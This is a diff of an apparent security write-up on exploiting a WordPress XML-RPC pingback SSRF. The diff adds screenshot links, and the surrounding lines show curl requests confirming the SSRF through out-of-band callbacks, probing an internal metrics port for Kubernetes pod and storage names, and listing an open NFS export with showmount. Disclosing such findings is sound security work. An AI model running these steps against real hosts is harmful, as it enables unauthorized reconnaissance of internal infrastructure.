@@ -29,6 +29,7 @@ curl -sk https://TARGET/blog/xmlrpc.php -d '<?xml version="1.0"?>
   <methodName>system.listMethods</methodName>
 </methodCall>'
 ```
+![Pingback curl request](Curl for Pingback.png)
 
 `pingback.ping` was available - the method WordPress uses to notify other sites of links. This is the SSRF entry point.
 
@@ -48,6 +49,8 @@ curl -sk https://TARGET/blog/xmlrpc.php -d '<?xml version="1.0"?>
   </params>
 </methodCall>'
 ```
+![Interactsh callbacks](interactch.png)
+![XML-RPC pingback method](pingback method.png)
 
 DNS and HTTP callbacks received on the OOB listener - SSRF confirmed. The server's outbound IP was now known.
 
@@ -61,6 +64,7 @@ Using the server IP obtained from the OOB callback, I queried internal services 
 ```bash
 curl -sk http://<INTERNAL-IP>:9100/metrics | grep "nfs\|sceptre\|storage" | head -20
 ```
+![Internal file systems exposed](file systems.png)
 
 **Extracted Kubernetes pod UUIDs:**
 ```bash
@@ -71,7 +75,7 @@ curl -sk http://<INTERNAL-IP>:9100/metrics | grep "sceptre-repo-storage" | grep 
 ```bash
 showmount -e <INTERNAL-IP>
 ```
-
+![NFS mount path](mount.png)
 Result: `/mnt/storage *` - exported to everyone with no restriction.
 
 **Queried RPC services:**
